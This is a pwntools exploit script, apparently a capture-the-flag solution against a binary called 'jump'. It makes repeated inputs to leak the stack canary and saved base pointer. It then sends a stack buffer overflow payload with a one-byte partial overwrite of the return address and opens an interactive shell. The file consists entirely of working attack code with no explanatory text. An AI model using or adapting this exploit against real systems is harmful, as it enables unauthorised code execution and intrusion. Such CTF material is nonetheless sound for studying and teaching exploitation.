from pwn import *
import sys
remote_addr = ["",]
#libc = ELF('')
elf = ELF('./jump')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./jump")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 1

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

debug('b *$rebase(0x1217)')

for i in range(216):
    sl(b'97')
sl(b'65')

s(b'c')
ru(b'A')
result = r()
canary = u64(result[:7].ljust(8, b'\x00')) << 8
rbp = u64(result[7:13].ljust(8, b'\x00'))

pr('canary', canary)
pr('rbp', rbp)

payload = b'a' * (0xe0 - 8) + p64(canary) + b'a' * 8 + p8(0x98)
s(payload)

shell()
